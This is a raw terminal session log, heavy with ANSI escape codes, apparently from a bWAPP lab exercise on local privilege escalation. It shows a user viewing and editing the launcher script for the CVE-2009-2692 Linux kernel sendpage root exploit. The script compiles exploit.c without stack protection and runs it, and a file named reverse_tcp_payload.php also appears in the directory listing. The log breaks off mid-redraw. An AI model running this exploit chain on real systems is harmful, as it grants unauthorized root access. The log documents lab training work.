+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ll
+total 144
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:48 01.session
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 17 17:49 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:49 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6946 Aug 17 17:49 01.session.script
+drwxr-xr-x 2 dinesh dinesh  4096 May  5  2014 [0m[01;34mcve-2009-2692[0m
+-rw-r--r-- 1 dinesh dinesh 20480 Aug 18 18:45 [01;31mcve-2009-2692.tar[0m
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 18:37 reverse_tcp_payload.php
+-rw-r--r-- 1 dinesh dinesh 28672 Aug 18 18:44 terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cd cve-2009-2692/
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ ll
+total 20
+-rw-r--r-- 1 dinesh dinesh  1208 Apr 23  2014 cve-2009-2692.sh
+-rw-r--r-- 1 dinesh dinesh 11119 May  5  2014 exploit.c
+-rw-r--r-- 1 dinesh dinesh   764 Apr 23  2014 pwnkernel.c
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ less cve-2009-2692.sh 
+[?1049h[22;0;0t[?1h=#!/bin/sh
+
+ESCAPED_PWD=`pwd | sed 's/\//\\\\\//g'`
+sed "s/\/home\/spender/$ESCAPED_PWD/g" pwnkernel.c > pwnkernel1.c
+mv pwnkernel.c pwnkernel2.c
+mv pwnkernel1.c pwnkernel.c
+killall -9 pulseaudio 2> /dev/null 
+IS_64=`uname -p`
+OPT_FLAG=""
+if [ "$IS_64" = "x86_64" ]; then
+  OPT_FLAG="-m64"
+fi 
+MINADDR=`cat /proc/sys/vm/mmap_min_addr 2> /dev/null`
+if [ "$MINADDR" = "" -o "$MINADDR" = "0" ]; then
+    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c 2> /dev/null
+    if [ "$?" = "1" ]; then
+       cc $OPT_FLAG -o exploit exploit.c
+    fi
+    cat tzameti.avi >> ./exploit
+    ./exploit
+elif [ ! -f '/usr/sbin/getenforce' ]; then
+    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o exploit.so exploit.c
+    cc $OPT_FLAG -o pwnkernel pwnkernel.c
+  ./pwnkernel
+else
+  RESULT=`/usr/sbin/getenforce`
+  if [ "$RESULT" != "Disabled" ]; then
+    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c
+    cat tzameti.avi >> ./exploit
+    runcon -t initrc_t -- sh -c ./exploit
+    if [ "$?" = "1" ]; then
+       ./exploit
+    fi
+  else
+    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o exploit.so exploit.c
+[7mcve-2009-2692.sh[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage/cve-2009-2692[01;31mdinesh@evil[00m: [[01;34mcve-2009-2692[00m] $ vim cve-2009-2692.sh 
+[?1049h[22;0;0t[>4;2m[?1h=[?2004h[1;36r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[36;1H"cve-2009-2692.sh" 40L, 1208C[2;1H▽[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H[4m[38;5;130m  1 [m[4m[34m#!/bin/sh[m[4m                                                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[2;1H[38;5;130m  2 [m[79C[1m[31m[48;5;121m [m
+[38;5;130m  3 [m[36mESCAPED_PWD[m=[35m`[m[38;5;130mpwd[m[35m [m[38;5;130m|[m[35m [m[38;5;130msed[m[35m [m[38;5;130m'[m[31ms/\//\\\\\//g[m[38;5;130m'[m[35m`[m[40C[1m[31m[48;5;121m [m
+[38;5;130m  4 sed[m [38;5;130m"[m[31ms/\/home\/spender/[m[35m$ESCAPED_PWD[m[31m/g[m[38;5;130m"[m pwnkernel.c [38;5;130m>[m pwnkernel1.c[14C[1m[31m[48;5;121m [m
+[38;5;130m  5 mv[m pwnkernel.c pwnkernel2.c[52C[1m[31m[48;5;121m [m
+[38;5;130m  6 mv[m pwnkernel1.c pwnkernel.c[52C[1m[31m[48;5;121m [m
+[38;5;130m  7 killall[m [31m-9[m pulseaudio [31m2[m[38;5;130m>[m /dev/null[45C[1m[31m[48;5;121m [m
+[38;5;130m  8 [m[36mIS_64[m=[35m`uname -p`[m[63C[1m[31m[48;5;121m [m
+[38;5;130m  9 [m[36mOPT_FLAG[m=[38;5;130m""[m[68C[1m[31m[48;5;121m [m
+[38;5;130m 10 if [[m [38;5;130m"[m[35m$IS_64[m[38;5;130m"[m [38;5;130m=[m [31m"x86_64"[m [38;5;130m];[m [38;5;130mthen[m[47C[1m[31m[48;5;121m [m
+[38;5;130m 11 [m  [36mOPT_FLAG[m=[38;5;130m"[m[31m-m64[m[38;5;130m"[m[62C[1m[31m[48;5;121m [m
+[38;5;130m 12 fi[m[77C[1m[31m[48;5;121m [m
+[38;5;130m 13 [m[36mMINADDR[m=[35m`[m[38;5;130mcat[m[35m /proc/sys/vm/mmap_min_addr [m[31m2[m[38;5;130m>[m[35m /dev/null`[m[26C[1m[31m[48;5;121m [m
+[38;5;130m 14 if [[m [38;5;130m"[m[35m$MINADDR[m[38;5;130m"[m [38;5;130m=[m [31m""[m [38;5;130m-o[m [38;5;130m"[m[35m$MINADDR[m[38;5;130m"[m [38;5;130m=[m [31m"0"[m [38;5;130m];[m [38;5;130mthen[m[31C[1m[31m[48;5;121m [m
+[38;5;130m 15 [m    cc [35m-fno-stack-protector[m [35m$OPT_FLAG[m [38;5;130m-o[m exploit exploit.c [31m2[m[38;5;130m>[m /dev/null[8C[1m[31m[48;5;121m [m
+[38;5;130m 16 [m    [38;5;130mif [[m [38;5;130m"[m[35m$?[m[38;5;130m"[m [38;5;130m=[m [31m"1"[m [38;5;130m];[m [38;5;130mthen[m[52C[1m[31m[48;5;121m [m
+[38;5;130m 17 [m[7Ccc [35m$OPT_FLAG[m [38;5;130m-o[m exploit exploit.c[39C[1m[31m[48;5;121m [m
+[38;5;130m 18 [m    [38;5;130mfi[m[73C[1m[31m[48;5;121m [m
+[38;5;130m 19 [m    [38;5;130mcat[m tzameti.avi [38;5;130m>>[m ./exploit[47C[1m[31m[48;5;121m [m
+[38;5;130m 20 [m    ./exploit[66C[1m[31m[48;5;121m [m
+[38;5;130m 21 elif[m [38;5;130m[[m [38;5;130m![m [38;5;130m-f[m [38;5;130m'[m[31m/usr/sbin/getenforce[m[38;5;130m'[m [38;5;130m];[m [38;5;130mthen[m[37C[1m[31m[48;5;121m [m
+[38;5;130m 22 [m    cc [35m-fno-stack-protector[m [35m-fPIC[m [35m$OPT_FLAG[m [35m-shared[m [38;5;130m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m
+[38;5;130m 23 [m    cc [35m$OPT_FLAG[m [38;5;130m-o[m pwnkernel pwnkernel.c[38C[1m[31m[48;5;121m [m
+[38;5;130m 24 [m  ./pwnkernel[66C[1m[31m[48;5;121m [m
+[38;5;130m 25 else[m[75C[1m[31m[48;5;121m [m
+[38;5;130m 26 [m  [36mRESULT[m=[35m`/usr/sbin/getenforce`[m[48C[1m[31m[48;5;121m [m
+[38;5;130m 27 [m  [38;5;130mif [[m [38;5;130m"[m[35m$RESULT[m[38;5;130m"[m [38;5;130m!=[m [38;5;130m"[m[31mDisabled[m[38;5;130m"[m [38;5;130m];[m [38;5;130mthen[m[41C[1m[31m[48;5;121m [m
+[38;5;130m 28 [m    cc [35m-fno-stack-protector[m [35m$OPT_FLAG[m [38;5;130m-o[m exploit exploit.c[21C[1m[31m[48;5;121m [m
+[38;5;130m 29 [m    [38;5;130mcat[m tzameti.avi [38;5;130m>>[m ./exploit[47C[1m[31m[48;5;121m [m
+[38;5;130m 30 [m    runcon [38;5;130m-t[m initrc_t [38;5;130m--[m sh [38;5;130m-c[m ./exploit[38C[1m[31m[48;5;121m [m
+[38;5;130m 31 [m    [38;5;130mif [[m [38;5;130m"[m[35m$?[m[38;5;130m"[m [38;5;130m=[m [31m"1"[m [38;5;130m];[m [38;5;130mthen[m[52C[1m[31m[48;5;121m [m
+[38;5;130m 32 [m[7C./exploit[63C[1m[31m[48;5;121m [m
+[38;5;130m 33 [m    [38;5;130mfi[m[73C[1m[31m[48;5;121m [m
+[38;5;130m 34 [m  [38;5;130melse[m[73C[1m[31m[48;5;121m [m
+[38;5;130m 35 [m    cc [35m-fno-stack-protector[m [35m-fPIC[m [35m$OPT_FLAG[m [35m-shared[m [38;5;130m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m[36;118H1,1[11CTop[1;5H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[27m[23m[29m[m[H[2J[?25l[1;1H[4m[93m  1 [m[4m[96m#!/bin/sh[m[4m                                                                      [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[2;1H[93m  2 [m[79C[1m[31m[48;5;121m [m
+[93m  3 [m[1m[96mESCAPED_PWD[m=[38;5;224m`[m[93mpwd[m[38;5;224m [m[93m|[m[38;5;224m [m[93msed[m[38;5;224m [m[93m'[m[95ms/\//\\\\\//g[m[93m'[m[38;5;224m`[m[40C[1m[31m[48;5;121m [m
+[93m  4 [m[93msed[m [93m"[m[95ms/\/home\/spender/[m[38;5;81m$ESCAPED_PWD[m[95m/g[m[93m"[m pwnkernel.c [93m>[m pwnkernel1.c[14C[1m[31m[48;5;121m [m
+[93m  5 [m[93mmv[m pwnkernel.c pwnkernel2.c[52C[1m[31m[48;5;121m [m
+[93m  6 [m[93mmv[m pwnkernel1.c pwnkernel.c[52C[1m[31m[48;5;121m [m
+[93m  7 [m[93mkillall[m [95m-9[m pulseaudio [95m2[m[93m>[m /dev/null[45C[1m[31m[48;5;121m [m
+[93m  8 [m[1m[96mIS_64[m=[38;5;224m`uname -p`[m[63C[1m[31m[48;5;121m [m
+[93m  9 [m[1m[96mOPT_FLAG[m=[93m""[m[68C[1m[31m[48;5;121m [m
+[93m 10 [m[93mif [[m [93m"[m[38;5;81m$IS_64[m[93m"[m [93m=[m [95m"x86_64"[m [93m];[m [93mthen[m[47C[1m[31m[48;5;121m [m
+[93m 11 [m  [1m[96mOPT_FLAG[m=[93m"[m[95m-m64[m[93m"[m[62C[1m[31m[48;5;121m [m
+[93m 12 [m[93mfi[m[77C[1m[31m[48;5;121m [m
+[93m 13 [m[1m[96mMINADDR[m=[38;5;224m`[m[93mcat[m[38;5;224m /proc/sys/vm/mmap_min_addr [m[95m2[m[93m>[m[38;5;224m /dev/null`[m[26C[1m[31m[48;5;121m [m
+[93m 14 [m[93mif [[m [93m"[m[38;5;81m$MINADDR[m[93m"[m [93m=[m [95m""[m [93m-o[m [93m"[m[38;5;81m$MINADDR[m[93m"[m [93m=[m [95m"0"[m [93m];[m [93mthen[m[31C[1m[31m[48;5;121m [m
+[93m 15 [m    cc [38;5;224m-fno-stack-protector[m [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c [95m2[m[93m>[m /dev/null[8C[1m[31m[48;5;121m [m
+[93m 16 [m    [93mif [[m [93m"[m[38;5;81m$?[m[93m"[m [93m=[m [95m"1"[m [93m];[m [93mthen[m[52C[1m[31m[48;5;121m [m
+[93m 17 [m[7Ccc [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c[39C[1m[31m[48;5;121m [m
+[93m 18 [m    [93mfi[m[73C[1m[31m[48;5;121m [m
+[93m 19 [m    [93mcat[m tzameti.avi [93m>>[m ./exploit[47C[1m[31m[48;5;121m [m
+[93m 20 [m    ./exploit[66C[1m[31m[48;5;121m [m
+[93m 21 [m[93melif[m [93m[[m [93m![m [93m-f[m [93m'[m[95m/usr/sbin/getenforce[m[93m'[m [93m];[m [93mthen[m[37C[1m[31m[48;5;121m [m
+[93m 22 [m    cc [38;5;224m-fno-stack-protector[m [38;5;224m-fPIC[m [38;5;81m$OPT_FLAG[m [38;5;224m-shared[m [93m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m
+[93m 23 [m    cc [38;5;81m$OPT_FLAG[m [93m-o[m pwnkernel pwnkernel.c[38C[1m[31m[48;5;121m [m
+[93m 24 [m  ./pwnkernel[66C[1m[31m[48;5;121m [m
+[93m 25 [m[93melse[m[75C[1m[31m[48;5;121m [m
+[93m 26 [m  [1m[96mRESULT[m=[38;5;224m`/usr/sbin/getenforce`[m[48C[1m[31m[48;5;121m [m
+[93m 27 [m  [93mif [[m [93m"[m[38;5;81m$RESULT[m[93m"[m [93m!=[m [93m"[m[95mDisabled[m[93m"[m [93m];[m [93mthen[m[41C[1m[31m[48;5;121m [m
+[93m 28 [m    cc [38;5;224m-fno-stack-protector[m [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c[21C[1m[31m[48;5;121m [m
+[93m 29 [m    [93mcat[m tzameti.avi [93m>>[m ./exploit[47C[1m[31m[48;5;121m [m
+[93m 30 [m    runcon [93m-t[m initrc_t [93m--[m sh [93m-c[m ./exploit[38C[1m[31m[48;5;121m [m
+[93m 31 [m    [93mif [[m [93m"[m[38;5;81m$?[m[93m"[m [93m=[m [95m"1"[m [93m];[m [93mthen[m[52C[1m[31m[48;5;121m [m
+[93m 32 [m[7C./exploit[63C[1m[31m[48;5;121m [m
+[93m 33 [m    [93mfi[m[73C[1m[31m[48;5;121m [m
+[93m 34 [m  [93melse[m[73C[1m[31m[48;5;121m [m
+[93m 35 [m    cc [38;5;224m-fno-stack-protector[m [38;5;224m-fPIC[m [38;5;81m$OPT_FLAG[m [38;5;224m-shared[m [93m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m[36;118H1,1[11CTop"cve-2009-2692.sh" 40L, 1208C[1;5H[?25h[?25l[93m  1 [m[96m#!/bin/sh[m                                                                      [1m[31m[48;5;121m [m[1;85H[K[2;1H[4m[93m  2 [m[4m                                                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H2,0-1[2;5H[?25h[?25l[93m  2 [m                                                                               [1m[31m[48;5;121m [m[2;85H[K[3;1H[4m[93m  3 [m[1m[4m[96mESCAPED_PWD[m[4m=[m[4m[38;5;224m`[m[4m[93mpwd[m[4m[38;5;224m [m[4m[93m|[m[4m[38;5;224m [m[4m[93msed[m[4m[38;5;224m [m[4m[93m'[m[4m[95ms/\//\\\\\//g[m[4m[93m'[m[4m[38;5;224m`[m[4m                                        [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H3,1  [3;5H[?25h[?25l[93m  3 [m[1m[96mESCAPED_PWD[m=[38;5;224m`[m[93mpwd[m[38;5;224m [m[93m|[m[38;5;224m [m[93msed[m[38;5;224m [m[93m'[m[95ms/\//\\\\\//g[m[93m'[m[38;5;224m`[m                                        [1m[31m[48;5;121m [m[3;85H[K[4;1H[4m[93m  4 [m[4m[93msed[m[4m [m[4m[93m"[m[4m[95ms/\/home\/spender/[m[4m[38;5;81m$ESCAPED_PWD[m[4m[95m/g[m[4m[93m"[m[4m pwnkernel.c [m[4m[93m>[m[4m pwnkernel1.c              [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H4[4;5H[?25h[?25l[93m  4 [m[93msed[m [93m"[m[95ms/\/home\/spender/[m[38;5;81m$ESCAPED_PWD[m[95m/g[m[93m"[m pwnkernel.c [93m>[m pwnkernel1.c              [1m[31m[48;5;121m [m[4;85H[K[5;1H[4m[93m  5 [m[4m[93mmv[m[4m pwnkernel.c pwnkernel2.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H5[5;5H[?25h[?25l[93m  5 [m[93mmv[m pwnkernel.c pwnkernel2.c                                                    [1m[31m[48;5;121m [m[5;85H[K[6;1H[4m[93m  6 [m[4m[93mmv[m[4m pwnkernel1.c pwnkernel.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H6[6;5H[?25h[?25l[93m  6 [m[93mmv[m pwnkernel1.c pwnkernel.c                                                    [1m[31m[48;5;121m [m[6;85H[K[7;1H[4m[93m  7 [m[4m[93mkillall[m[4m [m[4m[95m-9[m[4m pulseaudio [m[4m[95m2[m[4m[93m>[m[4m /dev/null                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H7[7;5H[?25h[?25l[93m  7 [m[93mkillall[m [95m-9[m pulseaudio [95m2[m[93m>[m /dev/null                                             [1m[31m[48;5;121m [m[7;85H[K[8;1H[4m[93m  8 [m[1m[4m[96mIS_64[m[4m=[m[4m[38;5;224m`uname -p`[m[4m                                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H8[8;5H[?25h[?25l[93m  8 [m[1m[96mIS_64[m=[38;5;224m`uname -p`[m                                                               [1m[31m[48;5;121m [m[8;85H[K[9;1H[4m[93m  9 [m[1m[4m[96mOPT_FLAG[m[4m=[m[4m[93m""[m[4m                                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H9[9;5H[?25h[?25l[8;1H[4m[93m  8 [m[1m[4m[96mIS_64[m[4m=[m[4m[38;5;224m`uname -p`[m[4m                                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[9;1H[93m  9 [m[1m[96mOPT_FLAG[m=[93m""[m                                                                    [1m[31m[48;5;121m [m[9;85H[K[36;118H8[8;5H[?25h[?25l[7;1H[4m[93m  7 [m[4m[93mkillall[m[4m [m[4m[95m-9[m[4m pulseaudio [m[4m[95m2[m[4m[93m>[m[4m /dev/null                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[8;1H[93m  8 [m[1m[96mIS_64[m=[38;5;224m`uname -p`[m                                                               [1m[31m[48;5;121m [m[8;85H[K[36;118H7[7;5H[?25h[?25l[6;1H[4m[93m  6 [m[4m[93mmv[m[4m pwnkernel1.c pwnkernel.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[7;1H[93m  7 [m[93mkillall[m [95m-9[m pulseaudio [95m2[m[93m>[m /dev/null                                             [1m[31m[48;5;121m [m[7;85H[K[36;118H6[6;5H[?25h[?25l[5;1H[4m[93m  5 [m[4m[93mmv[m[4m pwnkernel.c pwnkernel2.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[6;1H[93m  6 [m[93mmv[m pwnkernel1.c pwnkernel.c                                                    [1m[31m[48;5;121m [m[6;85H[K[36;118H5[5;5H[?25h[?25l[4;1H[4m[93m  4 [m[4m[93msed[m[4m [m[4m[93m"[m[4m[95ms/\/home\/spender/[m[4m[38;5;81m$ESCAPED_PWD[m[4m[95m/g[m[4m[93m"[m[4m pwnkernel.c [m[4m[93m>[m[4m pwnkernel1.c              [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[5;1H[93m  5 [m[93mmv[m pwnkernel.c pwnkernel2.c                                                    [1m[31m[48;5;121m [m[5;85H[K[36;118H4[4;5H[?25h[?25l[3;1H[4m[93m  3 [m[1m[4m[96mESCAPED_PWD[m[4m=[m[4m[38;5;224m`[m[4m[93mpwd[m[4m[38;5;224m [m[4m[93m|[m[4m[38;5;224m [m[4m[93msed[m[4m[38;5;224m [m[4m[93m'[m[4m[95ms/\//\\\\\//g[m[4m[93m'[m[4m[38;5;224m`[m[4m                                        [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[4;1H[93m  4 [m[93msed[m [93m"[m[95ms/\/home\/spender/[m[38;5;81m$ESCAPED_PWD[m[95m/g[m[93m"[m pwnkernel.c [93m>[m pwnkernel1.c              [1m[31m[48;5;121m [m[4;85H[K[36;118H3[3;5H[?25h[?25l[93m  3 [m[1m[96mESCAPED_PWD[m=[38;5;224m`[m[93mpwd[m[38;5;224m [m[93m|[m[38;5;224m [m[93msed[m[38;5;224m [m[93m'[m[95ms/\//\\\\\//g[m[93m'[m[38;5;224m`[m                                        [1m[31m[48;5;121m [m[3;85H[K[4;1H[4m[93m  4 [m[4m[93msed[m[4m [m[4m[93m"[m[4m[95ms/\/home\/spender/[m[4m[38;5;81m$ESCAPED_PWD[m[4m[95m/g[m[4m[93m"[m[4m pwnkernel.c [m[4m[93m>[m[4m pwnkernel1.c              [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H4[4;5H[?25h[?25l[93m  4 [m[93msed[m [93m"[m[95ms/\/home\/spender/[m[38;5;81m$ESCAPED_PWD[m[95m/g[m[93m"[m pwnkernel.c [93m>[m pwnkernel1.c              [1m[31m[48;5;121m [m[4;85H[K[5;1H[4m[93m  5 [m[4m[93mmv[m[4m pwnkernel.c pwnkernel2.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H5[5;5H[?25h[?25l[93m  5 [m[93mmv[m pwnkernel.c pwnkernel2.c                                                    [1m[31m[48;5;121m [m[5;85H[K[6;1H[4m[93m  6 [m[4m[93mmv[m[4m pwnkernel1.c pwnkernel.c                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H6[6;5H[?25h[?25l[93m  6 [m[93mmv[m pwnkernel1.c pwnkernel.c                                                    [1m[31m[48;5;121m [m[6;85H[K[7;1H[4m[93m  7 [m[4m[93mkillall[m[4m [m[4m[95m-9[m[4m pulseaudio [m[4m[95m2[m[4m[93m>[m[4m /dev/null                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H7[7;5H[?25h[?25l[93m  7 [m[93mkillall[m [95m-9[m pulseaudio [95m2[m[93m>[m /dev/null                                             [1m[31m[48;5;121m [m[7;85H[K[8;1H[4m[93m  8 [m[1m[4m[96mIS_64[m[4m=[m[4m[38;5;224m`uname -p`[m[4m                                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H8[8;5H[?25h[?25l[93m  8 [m[1m[96mIS_64[m=[38;5;224m`uname -p`[m                                                               [1m[31m[48;5;121m [m[8;85H[K[9;1H[4m[93m  9 [m[1m[4m[96mOPT_FLAG[m[4m=[m[4m[93m""[m[4m                                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H9[9;5H[?25h[?25l[93m  9 [m[1m[96mOPT_FLAG[m=[93m""[m                                                                    [1m[31m[48;5;121m [m[9;85H[K[10;1H[4m[93m 10 [m[4m[93mif [[m[4m [m[4m[93m"[m[4m[38;5;81m$IS_64[m[4m[93m"[m[4m [m[4m[93m=[m[4m [m[4m[95m"x86_64"[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H10,1[10;5H[?25h[?25l[93m 10 [m[93mif [[m [93m"[m[38;5;81m$IS_64[m[93m"[m [93m=[m [95m"x86_64"[m [93m];[m [93mthen[m                                               [1m[31m[48;5;121m [m[10;85H[K[11;1H[4m[93m 11 [m[4m  [m[1m[4m[96mOPT_FLAG[m[4m=[m[4m[93m"[m[4m[95m-m64[m[4m[93m"[m[4m                                                              [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H1[11;5H[?25h[?25l[93m 11 [m  [1m[96mOPT_FLAG[m=[93m"[m[95m-m64[m[93m"[m                                                              [1m[31m[48;5;121m [m[11;85H[K[12;1H[4m[93m 12 [m[4m[93mfi[m[4m                                                                             [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H2[12;5H[?25h[?25l[93m 12 [m[93mfi[m                                                                             [1m[31m[48;5;121m [m[12;85H[K[13;1H[4m[93m 13 [m[1m[4m[96mMINADDR[m[4m=[m[4m[38;5;224m`[m[4m[93mcat[m[4m[38;5;224m /proc/sys/vm/mmap_min_addr [m[4m[95m2[m[4m[93m>[m[4m[38;5;224m /dev/null`[m[4m                          [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H3[13;5H[?25h[?25l[93m 13 [m[1m[96mMINADDR[m=[38;5;224m`[m[93mcat[m[38;5;224m /proc/sys/vm/mmap_min_addr [m[95m2[m[93m>[m[38;5;224m /dev/null`[m                          [1m[31m[48;5;121m [m[13;85H[K[14;1H[4m[93m 14 [m[4m[93mif [[m[4m [m[4m[93m"[m[4m[38;5;81m$MINADDR[m[4m[93m"[m[4m [m[4m[93m=[m[4m [m[4m[95m""[m[4m [m[4m[93m-o[m[4m [m[4m[93m"[m[4m[38;5;81m$MINADDR[m[4m[93m"[m[4m [m[4m[93m=[m[4m [m[4m[95m"0"[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H4[14;5H[?25h[?25l[93m 14 [m[93mif [[m [93m"[m[38;5;81m$MINADDR[m[93m"[m [93m=[m [95m""[m [93m-o[m [93m"[m[38;5;81m$MINADDR[m[93m"[m [93m=[m [95m"0"[m [93m];[m [93mthen[m                               [1m[31m[48;5;121m [m[14;85H[K[15;1H[4m[93m 15 [m[4m    cc [m[4m[38;5;224m-fno-stack-protector[m[4m [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m exploit exploit.c [m[4m[95m2[m[4m[93m>[m[4m /dev/null        [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H5[15;5H[?25h[?25l[93m 15 [m    cc [38;5;224m-fno-stack-protector[m [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c [95m2[m[93m>[m /dev/null        [1m[31m[48;5;121m [m[15;85H[K[16;1H[4m[93m 16 [m[4m    [m[4m[93mif [[m[4m [m[4m[93m"[m[4m[38;5;81m$?[m[4m[93m"[m[4m [m[4m[93m=[m[4m [m[4m[95m"1"[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                                                    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H6[16;5H[?25h[?25l[93m 16 [m    [93mif [[m [93m"[m[38;5;81m$?[m[93m"[m [93m=[m [95m"1"[m [93m];[m [93mthen[m                                                    [1m[31m[48;5;121m [m[16;85H[K[17;1H[4m[93m 17 [m[4m       cc [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[93m-o[m[4m exploit exploit.c                                       [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H7[17;5H[?25h[?25l[93m 17 [m       cc [38;5;81m$OPT_FLAG[m [93m-o[m exploit exploit.c                                       [1m[31m[48;5;121m [m[17;85H[K[18;1H[4m[93m 18 [m[4m    [m[4m[93mfi[m[4m                                                                         [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H8[18;5H[?25h[?25l[93m 18 [m    [93mfi[m                                                                         [1m[31m[48;5;121m [m[18;85H[K[19;1H[4m[93m 19 [m[4m    [m[4m[93mcat[m[4m tzameti.avi [m[4m[93m>>[m[4m ./exploit                                               [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H9[19;5H[?25h[?25l[93m 19 [m    [93mcat[m tzameti.avi [93m>>[m ./exploit                                               [1m[31m[48;5;121m [m[19;85H[K[20;1H[4m[93m 20 [m[4m    ./exploit                                                                  [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;118H20[20;5H[?25h[?25l[93m 20 [m    ./exploit                                                                  [1m[31m[48;5;121m [m[20;85H[K[21;1H[4m[93m 21 [m[4m[93melif[m[4m [m[4m[93m[[m[4m [m[4m[93m![m[4m [m[4m[93m-f[m[4m [m[4m[93m'[m[4m[95m/usr/sbin/getenforce[m[4m[93m'[m[4m [m[4m[93m];[m[4m [m[4m[93mthen[m[4m                                     [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H1[21;5H[?25h[?25l[93m 21 [m[93melif[m [93m[[m [93m![m [93m-f[m [93m'[m[95m/usr/sbin/getenforce[m[93m'[m [93m];[m [93mthen[m                                     [1m[31m[48;5;121m [m[21;85H[K[22;1H[4m[93m 22 [m[4m    cc [m[4m[38;5;224m-fno-stack-protector[m[4m [m[4m[38;5;224m-fPIC[m[4m [m[4m[38;5;81m$OPT_FLAG[m[4m [m[4m[38;5;224m-shared[m[4m [m[4m[93m-o[m[4m exploit.so exploit.c    [m[1m[4m[31m[48;5;121m [m[4m                                                   [m[36;119H2[22;5H[?25h[?25l[93m 22 [m    cc [38;5;224m-fno-stack-protector[m [38;5;224m-fPIC[m [38;5;81m$OPT_FLAG[m [38;5;224m-shared[m [93m-o[m exploit.so exploit.c    [1m[31m[48;5;121m [m[22;85H[K[23;1H[4m[93m 23 [m[4m    cc 